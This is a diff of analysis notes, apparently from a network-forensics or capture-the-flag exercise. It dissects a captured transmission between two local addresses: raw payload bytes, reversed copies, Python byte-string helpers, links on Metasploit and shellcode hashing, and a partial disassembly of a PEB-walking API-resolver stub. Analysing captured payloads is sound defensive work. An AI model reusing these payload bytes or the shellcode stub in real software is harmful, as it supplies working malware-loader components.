@@ -1,87 +1,433 @@
 Messages sent from 192.168.68.21 to 192.168.68.1:
-Part 1:
-9c 5c 4f 52
+Send after connection succeed:
+part 1:
+9C 5C 4F 52
 
-Part 2:
-a4 b1 03 73 90 e4 c8 8e 97 b0 c9 5b c6 30 dc 6a bd f4 20 38 86 f9
-30 26 af ed d0 88 1b 92 4f e5 09 cd 5c 2e f5 e1
-68 f8 08 2b 48 da f7 59 9a d4 bb 92 19 ae 10 7b
-6e ed 7b 6d b1 85 4d 10 31 d2 8a 4e 7f 26 8b 10
-fd f4 1c c1 7f ab 5a 73 92 02 c0 cb 49 d9 53 d6
-df 6c 03 81 a0 21 01 6e 87 5f 09 fe 9a 69 94 35
-84 4f 01 96 6e 77 ec a3 f3 f5 2f 6a 36 36 ab 47
-75 b5 80 cb 47 bd 9f 76 38 a5 40 48 57 9c 36 ad
-8e 79 45 a3 20 fa ed 1f 18 49 b8 89 18 48 2b 5b
-6f ee f4 c3 d6 dc cc 84 ea b1 01 09 b1 31 4b a4
-05 50 98 b0 73 ae 9c 14 10 1b 65 bd 93 82 6c 57
-b9 75 7a 2a ee de 10 fb 39 ba 96 d0 36 1f c2 31
-2c c5 4f 33 a5 13 e1 59 56 92 c5 1f a5 4e 0e 62
-6e db 5b e8 7f 8d 01 a6 7d 01 2b 02 43 1f 54 b9
-bc d5 ef 2d b3 da ef 3d d0 68 fe da de 60 b1 17
-fe ea 20 4a 2c a1 bb a1 b5 c5 12 92 a9 db f1 11
-e3 8c 58 ba dc 3d 28 86 66 c8 6d 0e ab fa 83 d5
-24 60 10 68 1d c7 af c7 ac 45 13 a3 d9 72 e7 cc
-51 79 f5 67 41 7c ae 7f c8 7e 95 46 09 f6 ef 4b
-45 02 74 52 10 50 1c b7 6a 7c eb 00 d7 59 c3 29
-02 37 d0 47 2e 1e 3a f7 e6 ac 82 14 74 eb 4f 6b
-57 22 13 f6 f2 48 d6 6b cb b4 ed a7 32 68 cb d0
-66 42 d3 c5 f2 c5 37 df 7d 9f 9f 28 c0 74 3a be
-b8 c0 a7 73 d0 bb fa 50 7c 10 1e da b1 23 d6 c4
-81 a5 d3 b6 22 29 09 6b 21 a6 5c 38 c6 80 3d be
-08 23 c7 b1 1f 6d e6 64 66 95 dc 10 a7 13 42 cd
-3b fa dc da 14 8d d0 5a c8 81 35 54 2f b5 dc 61
-d6 28 77 88 c5 58 70 b5 2f cf ea 4f 4d 85 56 04
-07 f3 90 74 ce 5d 3c 8a 2b 06 b4 9f e6 6d 79 c0
-6e 3d d8 3e 20 08 b7 74 3d 36 99 cd 7f 60 7d 9c
-c9 b3 ad 0c 8e 45 6d ea 3d dd 09 1d da 0b 3a 1c
-fc cb 81 48 ed 5a fa ce f8 c6 23 b0 1e 26 44 a3
-d9 ab 0e d5 98 b1 33 65 5d ed 6a d3 23 7f 02 4a
-b3 a2 f8 1d 7e d1 2f 5f be 89 61 5e 2c e4 b8 96
-19 e5 49 76 4e 7a e8 92 a3 70 55 6f 7d 3c f9 c1
-36 44 69 33 7d df 79 37 b8 e0 aa e8 6a 5d c9 3b
-18 0f 4e 28 3a 31 a8 7f ef b8 19 ac 36 63 e8 89
-21 4d 83 a7 7e 57 03 48 9b e1 27 93 06 e4 3b 67
-5f e5 69 50 00 3e 8b 01 b7 ef a6 b5 4b 36 82 d4
-fb 9f de 8b 27 cc a4 57 ce 25 37 44 50 42 f7 7e
-a2 bf 4f df 0f 72 d8 66 4a 3e f5 c8 26 2a c5 88
-7b 97 ab 23 5b 2b 61 d8 3f 00 37 0e 7e 14 fa fd
-7d f7 81 49 c2 a1 85 1b d0 28 be a5 24 fd 60 b2
-78 27 4e ac e8 79 3b 3b 7a dc 56 d0 76 c5 01 0f
-cf 43 b5 d4 5f 48 70 bd ac 65 76 db 11 3b 5b cf
-9c 52 8b 00 1e 83 f1 fa 92 5b 77 79 07 6a e0 d4
-33 9a 71 ba 24 a5 a5 c8 eb 4c 01 b3 d3 cd 2c 22
-8c 0b 4c cd 2d 5a 8c 9a b1 67 70 7f 75 96 e2 56
-c1 1d ff 05 7e 77 a2 ba e5 9a ae f9 f8 b2 f1 78
-d2 b1 dc e9 03 c2 d4 ff 1f 66 cd b0 47 f0 b4 d1
-f6 72 fa 1e b7 f1 4d e7 6e 42 10 ec 5d 94 30 dd
-7f 75 1c 01 45 46 b6 14 6c f7 45 36 58 ec ef f3
-37 04 9c 21 eb 94 54 a3 fe 23 cb bb 31 5c 62 75
-bd ed 27 90 fe 91 17 e2 ae 42 9b 79 04 d1 5c ef
-cd 4b 86 93 4a 74 41 2d ad 0b 35 1d 81 fd 10 2c
-8e fd 8c 68 1d f5 45 0a b5 b4 09 be 0e fa fa d2
-f7 4e 58 d8 3c 1a 1b 11 3d 99 25 53 ab 78 ac 54
-49 bb 2a 42 b3 80 66 b5 63 e2 90 f8 a5 8f 37 af
-97 13 2b e8 fc 5d 4b 71 8b 4d 9f c8 ec 07 28 1f
-cb 30 92 1e 6d dc b9 de 94 b8 e9 cb 5a f7 a2 b0
-bb 0f c3 38 b7 27 33 1b e9 bf 45 2d 86 3e 34 6d
-12 f6 05 12 27 c5 28 e4 d2 61 26 7e 99 2b 3f 1f
-03 4d 79 72 b9 83 56 6d 8e 82 33 c2 09 eb 21 4a
-0c 13 ad ea 29 1b 58 da 10 16 43 20 55 7d f4 b7
-fc 26 34 68 8b a0 54 af 07 d5 d5 23 b5 23 b8 fb
-07 c6 64 4a 56 7f a0 6d 86 7c 33 3b 23 b7 9d 9c
-a8 22 b1 79 9f 00 e7 76 e9 c7 68 ae 5c 23 ae 9f
-c6 45 91 48 83 6f bf 0a d8 c9 77 ab 2c 2d 85 47
-bf e9 81 80 13 d9 dc 1c 21 0f f4 c7 79 07 52 a8
-06 8c 57 63 53 b2 fb 7d be 6c 1a ae 2e bd c6 fd
-97 0a 04 ed c0 a3 05 45 db 9b 62 bd 34 a9 08 25
-53 00 90 36 cf d9 63 15 a5 f7 f8 e0 d8 69 fd 79
-24 60 7b a2 ae bd f2 b4 b9 c2 08 84 65 a9 6d eb
-a5 d8 72 a7 b6 59 21 b9 f4 11 12 5d 39 1d 15 75
-6d 8a 2f 58 c2 fc 80 02 51 78 a9 fc 7d de 0d 85
-a5 57 18 f8 f0 cc 8e 4c 5e d7 65 58 74 4e 8a 44
-33 a2 24 e3 56 57 68 ba bb f2 b2 32 98 f1 88 2e
-c3
+reversed:
+52 4f 5c 9c
+
+a='\x9c\x5c\x4F\x52'
+part 2:
+A4 B1 03 73 90 E4 C8 8E 97 B0 C9 5B C6 30 DC 6A BD F4 20 38 86 F9 30 26 AF ED D0 88 1B 92 4F E5 09 CD 5C 2E F5 E1 68 F8 08 2B 48 DA F7 59 9A D4 BB 92 19 AE 10 7B 6E ED 7B 6D B1 85 4D 10 31 D2 8A 4E 7F 26 8B 10 FD F4 1C C1 7F AB 5A 73 92 02 C0 CB 49 D9 53 D6 DF 6C 03 81 A0 21 01 6E 87 5F 09 FE 9A 69 94 35 84 4F 01 96 6E 77 EC A3 F3 F5 2F 6A 36 36 AB 47 75 B5 80 CB 47 BD 9F 76 38 A5 40 48 57 9C 36 AD 8E 79 45 A3 20 FA ED 1F 18 49 B8 89 18 48 2B 5B 6F EE F4 C3 D6 DC CC 84 EA B1 01 09 B1 31 4B A4 05 50 98 B0 73 AE 9C 14 10 1B 65 BD 93 82 6C 57 B9 75 7A 2A EE DE 10 FB 39 BA 96 D0 36 1F C2 31 2C C5 4F 33 A5 13 E1 59 56 92 C5 1F A5 4E 0E 62 6E DB 5B E8 7F 8D 01 A6 7D 01 2B 02 43 1F 54 B9 BC D5 EF 2D B3 DA EF 3D D0 68 FE DA DE 60 B1 17 FE EA 20 4A 2C A1 BB A1 B5 C5 12 92 A9 DB F1 11 E3 8C 58 BA DC 3D 28 86 66 C8 6D 0E AB FA 83 D5 24 60 10 68 1D C7 AF C7 AC 45 13 A3 D9 72 E7 CC 51 79 F5 67 41 7C AE 7F C8 7E 95 46 09 F6 EF 4B 45 02 74 52 10 50 1C B7 6A 7C EB 00 D7 59 C3 29 02 37 D0 47 2E 1E 3A F7 E6 AC 82 14 74 EB 4F 6B 57 22 13 F6 F2 48 D6 6B CB B4 ED A7 32 68 CB D0 66 42 D3 C5 F2 C5 37 DF 7D 9F 9F 28 C0 74 3A BE B8 C0 A7 73 D0 BB FA 50 7C 10 1E DA B1 23 D6 C4 81 A5 D3 B6 22 29 09 6B 21 A6 5C 38 C6 80 3D BE 08 23 C7 B1 1F 6D E6 64 66 95 DC 10 A7 13 42 CD 3B FA DC DA 14 8D D0 5A C8 81 35 54 2F B5 DC 61 D6 28 77 88 C5 58 70 B5 2F CF EA 4F 4D 85 56 04 07 F3 90 74 CE 5D 3C 8A 2B 06 B4 9F E6 6D 79 C0 6E 3D D8 3E 20 08 B7 74 3D 36 99 CD 7F 60 7D 9C C9 B3 AD 0C 8E 45 6D EA 3D DD 09 1D DA 0B 3A 1C FC CB 81 48 ED 5A FA CE F8 C6 23 B0 1E 26 44 A3 D9 AB 0E D5 98 B1 33 65 5D ED 6A D3 23 7F 02 4A B3 A2 F8 1D 7E D1 2F 5F BE 89 61 5E 2C E4 B8 96 19 E5 49 76 4E 7A E8 92 A3 70 55 6F 7D 3C F9 C1 36 44 69 33 7D DF 79 37 B8 E0 AA E8 6A 5D C9 3B 18 0F 4E 28 3A 31 A8 7F EF B8 19 AC 36 63 E8 89 21 4D 83 A7 7E 57 03 48 9B E1 27 93 06 E4 3B 67 5F E5 69 50 00 3E 8B 01 B7 EF A6 B5 4B 36 82 D4 FB 9F DE 8B 27 CC A4 57 CE 25 37 44 50 42 F7 7E A2 BF 4F DF 0F 72 D8 66 4A 3E F5 C8 26 2A C5 88 7B 97 AB 23 5B 2B 61 D8 3F 00 37 0E 7E 14 FA FD 7D F7 81 49 C2 A1 85 1B D0 28 BE A5 24 FD 60 B2 78 27 4E AC E8 79 3B 3B 7A DC 56 D0 76 C5 01 0F CF 43 B5 D4 5F 48 70 BD AC 65 76 DB 11 3B 5B CF 9C 52 8B 00 1E 83 F1 FA 92 5B 77 79 07 6A E0 D4 33 9A 71 BA 24 A5 A5 C8 EB 4C 01 B3 D3 CD 2C 22 8C 0B 4C CD 2D 5A 8C 9A B1 67 70 7F 75 96 E2 56 C1 1D FF 05 7E 77 A2 BA E5 9A AE F9 F8 B2 F1 78 D2 B1 DC E9 03 C2 D4 FF 1F 66 CD B0 47 F0 B4 D1 F6 72 FA 1E B7 F1 4D E7 6E 42 10 EC 5D 94 30 DD 7F 75 1C 01 45 46 B6 14 6C F7 45 36 58 EC EF F3 37 04 9C 21 EB 94 54 A3 FE 23 CB BB 31 5C 62 75 BD ED 27 90 FE 91 17 E2 AE 42 9B 79 04 D1 5C EF CD 4B 86 93 4A 74 41 2D AD 0B 35 1D 81 FD 10 2C 8E FD 8C 68 1D F5 45 0A B5 B4 09 BE 0E FA FA D2 F7 4E 58 D8 3C 1A 1B 11 3D 99 25 53 AB 78 AC 54 49 BB 2A 42 B3 80 66 B5 63 E2 90 F8 A5 8F 37 AF 97 13 2B E8 FC 5D 4B 71 8B 4D 9F C8 EC 07 28 1F CB 30 92 1E 6D DC B9 DE 94 B8 E9 CB 5A F7 A2 B0 BB 0F C3 38 B7 27 33 1B E9 BF 45 2D 86 3E 34 6D 12 F6 05 12 27 C5 28 E4 D2 61 26 7E 99 2B 3F 1F 03 4D 79 72 B9 83 56 6D 8E 82 33 C2 09 EB 21 4A 0C 13 AD EA 29 1B 58 DA 10 16 43 20 55 7D F4 B7 FC 26 34 68 8B A0 54 AF 07 D5 D5 23 B5 23 B8 FB 07 C6 64 4A 56 7F A0 6D 86 7C 33 3B 23 B7 9D 9C A8 22 B1 79 9F 00 E7 76 E9 C7 68 AE 5C 23 AE 9F C6 45 91 48 83 6F BF 0A D8 C9 77 AB 2C 2D 85 47 BF E9 81 80 13 D9 DC 1C 21 0F F4 C7 79 07 52 A8 06 8C 57 63 53 B2 FB 7D BE 6C 1A AE 2E BD C6 FD 97 0A 04 ED C0 A3 05 45 DB 9B 62 BD 34 A9 08 25 53 00 90 36 CF D9 63 15 A5 F7 F8 E0 D8 69 FD 79 24 60 7B A2 AE BD F2 B4 B9 C2 08 84 65 A9 6D EB A5 D8 72 A7 B6 59 21 B9 F4 11 12 5D 39 1D 15 75 6D 8A 2F 58 C2 FC 80 02 51 78 A9 FC 7D DE 0D 85 A5 57 18 F8 F0 CC 8E 4C 5E D7 65 58 74 4E 8A 44 33 A2 24 E3 56 57 68 BA BB F2 B2 32 98 F1 88 2E C3
+
+b='\xA4\xB1\x03\x73\x90\xE4\xC8\x8E\x97\xB0\xC9\x5B\xC6\x30\xDC\x6A\xBD\xF4\x20\x38\x86\xF9\x30\x26\xAF\xED\xD0\x88\x1B\x92\x4F\xE5\x09\xCD\x5C\x2E\xF5\xE1\x68\xF8\x08\x2B\x48\xDA\xF7\x59\x9A\xD4\xBB\x92\x19\xAE\x10\x7B\x6E\xED\x7B\x6D\xB1\x85\x4D\x10\x31\xD2\x8A\x4E\x7F\x26\x8B\x10\xFD\xF4\x1C\xC1\x7F\xAB\x5A\x73\x92\x02\xC0\xCB\x49\xD9\x53\xD6\xDF\x6C\x03\x81\xA0\x21\x01\x6E\x87\x5F\x09\xFE\x9A\x69\x94\x35\x84\x4F\x01\x96\x6E\x77\xEC\xA3\xF3\xF5\x2F\x6A\x36\x36\xAB\x47\x75\xB5\x80\xCB\x47\xBD\x9F\x76\x38\xA5\x40\x48\x57\x9C\x36\xAD\x8E\x79\x45\xA3\x20\xFA\xED\x1F\x18\x49\xB8\x89\x18\x48\x2B\x5B\x6F\xEE\xF4\xC3\xD6\xDC\xCC\x84\xEA\xB1\x01\x09\xB1\x31\x4B\xA4\x05\x50\x98\xB0\x73\xAE\x9C\x14\x10\x1B\x65\xBD\x93\x82\x6C\x57\xB9\x75\x7A\x2A\xEE\xDE\x10\xFB\x39\xBA\x96\xD0\x36\x1F\xC2\x31\x2C\xC5\x4F\x33\xA5\x13\xE1\x59\x56\x92\xC5\x1F\xA5\x4E\x0E\x62\x6E\xDB\x5B\xE8\x7F\x8D\x01\xA6\x7D\x01\x2B\x02\x43\x1F\x54\xB9\xBC\xD5\xEF\x2D\xB3\xDA\xEF\x3D\xD0\x68\xFE\xDA\xDE\x60\xB1\x17\xFE\xEA\x20\x4A\x2C\xA1\xBB\xA1\xB5\xC5\x12\x92\xA9\xDB\xF1\x11\xE3\x8C\x58\xBA\xDC\x3D\x28\x86\x66\xC8\x6D\x0E\xAB\xFA\x83\xD5\x24\x60\x10\x68\x1D\xC7\xAF\xC7\xAC\x45\x13\xA3\xD9\x72\xE7\xCC\x51\x79\xF5\x67\x41\x7C\xAE\x7F\xC8\x7E\x95\x46\x09\xF6\xEF\x4B\x45\x02\x74\x52\x10\x50\x1C\xB7\x6A\x7C\xEB\x00\xD7\x59\xC3\x29\x02\x37\xD0\x47\x2E\x1E\x3A\xF7\xE6\xAC\x82\x14\x74\xEB\x4F\x6B\x57\x22\x13\xF6\xF2\x48\xD6\x6B\xCB\xB4\xED\xA7\x32\x68\xCB\xD0\x66\x42\xD3\xC5\xF2\xC5\x37\xDF\x7D\x9F\x9F\x28\xC0\x74\x3A\xBE\xB8\xC0\xA7\x73\xD0\xBB\xFA\x50\x7C\x10\x1E\xDA\xB1\x23\xD6\xC4\x81\xA5\xD3\xB6\x22\x29\x09\x6B\x21\xA6\x5C\x38\xC6\x80\x3D\xBE\x08\x23\xC7\xB1\x1F\x6D\xE6\x64\x66\x95\xDC\x10\xA7\x13\x42\xCD\x3B\xFA\xDC\xDA\x14\x8D\xD0\x5A\xC8\x81\x35\x54\x2F\xB5\xDC\x61\xD6\x28\x77\x88\xC5\x58\x70\xB5\x2F\xCF\xEA\x4F\x4D\x85\x56\x04\x07\xF3\x90\x74\xCE\x5D\x3C\x8A\x2B\x06\xB4\x9F\xE6\x6D\x79\xC0\x6E\x3D\xD8\x3E\x20\x08\xB7\x74\x3D\x36\x99\xCD\x7F\x60\x7D\x9C\xC9\xB3\xAD\x0C\x8E\x45\x6D\xEA\x3D\xDD\x09\x1D\xDA\x0B\x3A\x1C\xFC\xCB\x81\x48\xED\x5A\xFA\xCE\xF8\xC6\x23\xB0\x1E\x26\x44\xA3\xD9\xAB\x0E\xD5\x98\xB1\x33\x65\x5D\xED\x6A\xD3\x23\x7F\x02\x4A\xB3\xA2\xF8\x1D\x7E\xD1\x2F\x5F\xBE\x89\x61\x5E\x2C\xE4\xB8\x96\x19\xE5\x49\x76\x4E\x7A\xE8\x92\xA3\x70\x55\x6F\x7D\x3C\xF9\xC1\x36\x44\x69\x33\x7D\xDF\x79\x37\xB8\xE0\xAA\xE8\x6A\x5D\xC9\x3B\x18\x0F\x4E\x28\x3A\x31\xA8\x7F\xEF\xB8\x19\xAC\x36\x63\xE8\x89\x21\x4D\x83\xA7\x7E\x57\x03\x48\x9B\xE1\x27\x93\x06\xE4\x3B\x67\x5F\xE5\x69\x50\x00\x3E\x8B\x01\xB7\xEF\xA6\xB5\x4B\x36\x82\xD4\xFB\x9F\xDE\x8B\x27\xCC\xA4\x57\xCE\x25\x37\x44\x50\x42\xF7\x7E\xA2\xBF\x4F\xDF\x0F\x72\xD8\x66\x4A\x3E\xF5\xC8\x26\x2A\xC5\x88\x7B\x97\xAB\x23\x5B\x2B\x61\xD8\x3F\x00\x37\x0E\x7E\x14\xFA\xFD\x7D\xF7\x81\x49\xC2\xA1\x85\x1B\xD0\x28\xBE\xA5\x24\xFD\x60\xB2\x78\x27\x4E\xAC\xE8\x79\x3B\x3B\x7A\xDC\x56\xD0\x76\xC5\x01\x0F\xCF\x43\xB5\xD4\x5F\x48\x70\xBD\xAC\x65\x76\xDB\x11\x3B\x5B\xCF\x9C\x52\x8B\x00\x1E\x83\xF1\xFA\x92\x5B\x77\x79\x07\x6A\xE0\xD4\x33\x9A\x71\xBA\x24\xA5\xA5\xC8\xEB\x4C\x01\xB3\xD3\xCD\x2C\x22\x8C\x0B\x4C\xCD\x2D\x5A\x8C\x9A\xB1\x67\x70\x7F\x75\x96\xE2\x56\xC1\x1D\xFF\x05\x7E\x77\xA2\xBA\xE5\x9A\xAE\xF9\xF8\xB2\xF1\x78\xD2\xB1\xDC\xE9\x03\xC2\xD4\xFF\x1F\x66\xCD\xB0\x47\xF0\xB4\xD1\xF6\x72\xFA\x1E\xB7\xF1\x4D\xE7\x6E\x42\x10\xEC\x5D\x94\x30\xDD\x7F\x75\x1C\x01\x45\x46\xB6\x14\x6C\xF7\x45\x36\x58\xEC\xEF\xF3\x37\x04\x9C\x21\xEB\x94\x54\xA3\xFE\x23\xCB\xBB\x31\x5C\x62\x75\xBD\xED\x27\x90\xFE\x91\x17\xE2\xAE\x42\x9B\x79\x04\xD1\x5C\xEF\xCD\x4B\x86\x93\x4A\x74\x41\x2D\xAD\x0B\x35\x1D\x81\xFD\x10\x2C\x8E\xFD\x8C\x68\x1D\xF5\x45\x0A\xB5\xB4\x09\xBE\x0E\xFA\xFA\xD2\xF7\x4E\x58\xD8\x3C\x1A\x1B\x11\x3D\x99\x25\x53\xAB\x78\xAC\x54\x49\xBB\x2A\x42\xB3\x80\x66\xB5\x63\xE2\x90\xF8\xA5\x8F\x37\xAF\x97\x13\x2B\xE8\xFC\x5D\x4B\x71\x8B\x4D\x9F\xC8\xEC\x07\x28\x1F\xCB\x30\x92\x1E\x6D\xDC\xB9\xDE\x94\xB8\xE9\xCB\x5A\xF7\xA2\xB0\xBB\x0F\xC3\x38\xB7\x27\x33\x1B\xE9\xBF\x45\x2D\x86\x3E\x34\x6D\x12\xF6\x05\x12\x27\xC5\x28\xE4\xD2\x61\x26\x7E\x99\x2B\x3F\x1F\x03\x4D\x79\x72\xB9\x83\x56\x6D\x8E\x82\x33\xC2\x09\xEB\x21\x4A\x0C\x13\xAD\xEA\x29\x1B\x58\xDA\x10\x16\x43\x20\x55\x7D\xF4\xB7\xFC\x26\x34\x68\x8B\xA0\x54\xAF\x07\xD5\xD5\x23\xB5\x23\xB8\xFB\x07\xC6\x64\x4A\x56\x7F\xA0\x6D\x86\x7C\x33\x3B\x23\xB7\x9D\x9C\xA8\x22\xB1\x79\x9F\x00\xE7\x76\xE9\xC7\x68\xAE\x5C\x23\xAE\x9F\xC6\x45\x91\x48\x83\x6F\xBF\x0A\xD8\xC9\x77\xAB\x2C\x2D\x85\x47\xBF\xE9\x81\x80\x13\xD9\xDC\x1C\x21\x0F\xF4\xC7\x79\x07\x52\xA8\x06\x8C\x57\x63\x53\xB2\xFB\x7D\xBE\x6C\x1A\xAE\x2E\xBD\xC6\xFD\x97\x0A\x04\xED\xC0\xA3\x05\x45\xDB\x9B\x62\xBD\x34\xA9\x08\x25\x53\x00\x90\x36\xCF\xD9\x63\x15\xA5\xF7\xF8\xE0\xD8\x69\xFD\x79\x24\x60\x7B\xA2\xAE\xBD\xF2\xB4\xB9\xC2\x08\x84\x65\xA9\x6D\xEB\xA5\xD8\x72\xA7\xB6\x59\x21\xB9\xF4\x11\x12\x5D\x39\x1D\x15\x75\x6D\x8A\x2F\x58\xC2\xFC\x80\x02\x51\x78\xA9\xFC\x7D\xDE\x0D\x85\xA5\x57\x18\xF8\xF0\xCC\x8E\x4C\x5E\xD7\x65\x58\x74\x4E\x8A\x44\x33\xA2\x24\xE3\x56\x57\x68\xBA\xBB\xF2\xB2\x32\x98\xF1\x88\x2E\xC3'
+
+' '.join([hex(ord(i)) for i in b])
+' '.join([hex(ord(i)) for i in b[::-1]])
+' '.join(["0x{:02x}".format(ord(i)) for i in b[::-1]])
+
+
+Reversed part 2:
+c3 2e 88 f1 98 32 b2 f2 bb ba 68 57 56 e3 24 a2 33 44 8a 4e 74 58 65 d7 5e 4c 8e cc f0 f8 18 57 a5 85 0d de 7d fc a9 78 51 02 80 fc c2 58 2f 8a 6d 75 15 1d 39 5d 12 11 f4 b9 21 59 b6 a7 72 d8 a5 eb 6d a9 65 84 08 c2 b9 b4 f2 bd ae a2 7b 60 24 79 fd 69 d8 e0 f8 f7 a5 15 63 d9 cf 36 90 00 53 25 08 a9 34 bd 62 9b db 45 05 a3 c0 ed 04 0a 97 fd c6 bd 2e ae 1a 6c be 7d fb b2 53 63 57 8c 06 a8 52 07 79 c7 f4 0f 21 1c dc d9 13 80 81 e9 bf 47 85 2d 2c ab 77 c9 d8 0a bf 6f 83 48 91 45 c6 9f ae 23 5c ae 68 c7 e9 76 e7 00 9f 79 b1 22 a8 9c 9d b7 23 3b 33 7c 86 6d a0 7f 56 4a 64 c6 07 fb b8 23 b5 23 d5 d5 07 af 54 a0 8b 68 34 26 fc b7 f4 7d 55 20 43 16 10 da 58 1b 29 ea ad 13 0c 4a 21 eb 09 c2 33 82 8e 6d 56 83 b9 72 79 4d 03 1f 3f 2b 99 7e 26 61 d2 e4 28 c5 27 12 05 f6 12 6d 34 3e 86 2d 45 bf e9 1b 33 27 b7 38 c3 0f bb b0 a2 f7 5a cb e9 b8 94 de b9 dc 6d 1e 92 30 cb 1f 28 07 ec c8 9f 4d 8b 71 4b 5d fc e8 2b 13 97 af 37 8f a5 f8 90 e2 63 b5 66 80 b3 42 2a bb 49 54 ac 78 ab 53 25 99 3d 11 1b 1a 3c d8 58 4e f7 d2 fa fa 0e be 09 b4 b5 0a 45 f5 1d 68 8c fd 8e 2c 10 fd 81 1d 35 0b ad 2d 41 74 4a 93 86 4b cd ef 5c d1 04 79 9b 42 ae e2 17 91 fe 90 27 ed bd 75 62 5c 31 bb cb 23 fe a3 54 94 eb 21 9c 04 37 f3 ef ec 58 36 45 f7 6c 14 b6 46 45 01 1c 75 7f dd 30 94 5d ec 10 42 6e e7 4d f1 b7 1e fa 72 f6 d1 b4 f0 47 b0 cd 66 1f ff d4 c2 03 e9 dc b1 d2 78 f1 b2 f8 f9 ae 9a e5 ba a2 77 7e 05 ff 1d c1 56 e2 96 75 7f 70 67 b1 9a 8c 5a 2d cd 4c 0b 8c 22 2c cd d3 b3 01 4c eb c8 a5 a5 24 ba 71 9a 33 d4 e0 6a 07 79 77 5b 92 fa f1 83 1e 00 8b 52 9c cf 5b 3b 11 db 76 65 ac bd 70 48 5f d4 b5 43 cf 0f 01 c5 76 d0 56 dc 7a 3b 3b 79 e8 ac 4e 27 78 b2 60 fd 24 a5 be 28 d0 1b 85 a1 c2 49 81 f7 7d fd fa 14 7e 0e 37 00 3f d8 61 2b 5b 23 ab 97 7b 88 c5 2a 26 c8 f5 3e 4a 66 d8 72 0f df 4f bf a2 7e f7 42 50 44 37 25 ce 57 a4 cc 27 8b de 9f fb d4 82 36 4b b5 a6 ef b7 01 8b 3e 00 50 69 e5 5f 67 3b e4 06 93 27 e1 9b 48 03 57 7e a7 83 4d 21 89 e8 63 36 ac 19 b8 ef 7f a8 31 3a 28 4e 0f 18 3b c9 5d 6a e8 aa e0 b8 37 79 df 7d 33 69 44 36 c1 f9 3c 7d 6f 55 70 a3 92 e8 7a 4e 76 49 e5 19 96 b8 e4 2c 5e 61 89 be 5f 2f d1 7e 1d f8 a2 b3 4a 02 7f 23 d3 6a ed 5d 65 33 b1 98 d5 0e ab d9 a3 44 26 1e b0 23 c6 f8 ce fa 5a ed 48 81 cb fc 1c 3a 0b da 1d 09 dd 3d ea 6d 45 8e 0c ad b3 c9 9c 7d 60 7f cd 99 36 3d 74 b7 08 20 3e d8 3d 6e c0 79 6d e6 9f b4 06 2b 8a 3c 5d ce 74 90 f3 07 04 56 85 4d 4f ea cf 2f b5 70 58 c5 88 77 28 d6 61 dc b5 2f 54 35 81 c8 5a d0 8d 14 da dc fa 3b cd 42 13 a7 10 dc 95 66 64 e6 6d 1f b1 c7 23 08 be 3d 80 c6 38 5c a6 21 6b 09 29 22 b6 d3 a5 81 c4 d6 23 b1 da 1e 10 7c 50 fa bb d0 73 a7 c0 b8 be 3a 74 c0 28 9f 9f 7d df 37 c5 f2 c5 d3 42 66 d0 cb 68 32 a7 ed b4 cb 6b d6 48 f2 f6 13 22 57 6b 4f eb 74 14 82 ac e6 f7 3a 1e 2e 47 d0 37 02 29 c3 59 d7 00 eb 7c 6a b7 1c 50 10 52 74 02 45 4b ef f6 09 46 95 7e c8 7f ae 7c 41 67 f5 79 51 cc e7 72 d9 a3 13 45 ac c7 af c7 1d 68 10 60 24 d5 83 fa ab 0e 6d c8 66 86 28 3d dc ba 58 8c e3 11 f1 db a9 92 12 c5 b5 a1 bb a1 2c 4a 20 ea fe 17 b1 60 de da fe 68 d0 3d ef da b3 2d ef d5 bc b9 54 1f 43 02 2b 01 7d a6 01 8d 7f e8 5b db 6e 62 0e 4e a5 1f c5 92 56 59 e1 13 a5 33 4f c5 2c 31 c2 1f 36 d0 96 ba 39 fb 10 de ee 2a 7a 75 b9 57 6c 82 93 bd 65 1b 10 14 9c ae 73 b0 98 50 05 a4 4b 31 b1 09 01 b1 ea 84 cc dc d6 c3 f4 ee 6f 5b 2b 48 18 89 b8 49 18 1f ed fa 20 a3 45 79 8e ad 36 9c 57 48 40 a5 38 76 9f bd 47 cb 80 b5 75 47 ab 36 36 6a 2f f5 f3 a3 ec 77 6e 96 01 4f 84 35 94 69 9a fe 09 5f 87 6e 01 21 a0 81 03 6c df d6 53 d9 49 cb c0 02 92 73 5a ab 7f c1 1c f4 fd 10 8b 26 7f 4e 8a d2 31 10 4d 85 b1 6d 7b ed 6e 7b 10 ae 19 92 bb d4 9a 59 f7 da 48 2b 08 f8 68 e1 f5 2e 5c cd 09 e5 4f 92 1b 88 d0 ed af 26 30 f9 86 38 20 f4 bd 6a dc 30 c6 5b c9 b0 97 8e c8 e4 90 73 03 b1 a4
+
+
+Like 
+https://github.com/rapid7/metasploit-framework/issues/8160
+
+
+https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html
+https://github.com/iagox86/nbtool/blob/master/samples/shellcode-win32/hash.py
 
 
 
 
+0:  e8 82 00 00 00          call   0x87
+5:  60                      pusha
+6:  89 e5                   mov    ebp,esp
+8:  31 c0                   xor    eax,eax
+a:  64 8b 50 30             mov    edx,DWORD PTR fs:[eax+0x30]
+e:  8b 52 0c                mov    edx,DWORD PTR [edx+0xc]
+11: 8b 52 14                mov    edx,DWORD PTR [edx+0x14]
+14: 8b 72 28                mov    esi,DWORD PTR [edx+0x28]
+17: 0f b7 4a 26             movzx  ecx,WORD PTR [edx+0x26]
+1b: 31 ff                   xor    edi,edi
+1d: ac                      lods   al,BYTE PTR ds:[esi]
+1e: 3c 61                   cmp    al,0x61
+20: 7c 02                   jl     0x24
+22: 2c 20                   sub    al,0x20
+24: c1 cf 0d                ror    edi,0xd
+27: 01 c7                   add    edi,eax
+29: e2 f2                   loop   0x1d
+2b: 52                      push   edx
+2c: 57                      push   edi
+2d: 8b 52 10                mov    edx,DWORD PTR [edx+0x10]
+30: 8b 4a 3c                mov    ecx,DWORD PTR [edx+0x3c]
+33: 8b 4c 11 78             mov    ecx,DWORD PTR [ecx+edx*1+0x78]
+37: e3 48                   jecxz  0x81
+39: 01 d1                   add    ecx,edx
+3b: 51                      push   ecx
+3c: 8b 59 20                mov    ebx,DWORD PTR [ecx+0x20]
+3f: 01 d3                   add    ebx,edx
+41: 8b 49 18                mov    ecx,DWORD PTR [ecx+0x18]
+44: e3 3a                   jecxz  0x80
+46: 49                      dec    ecx
+47: 8b 34 8b                mov    esi,DWORD PTR [ebx+ecx*4]
+4a: 01 d6                   add    esi,edx
+4c: 31 ff                   xor    edi,edi
+4e: ac                      lods   al,BYTE PTR ds:[esi]
+4f: c1 cf 0d                ror    edi,0xd
+52: 01 c7                   add    edi,eax
+54: 38 e0                   cmp    al,ah
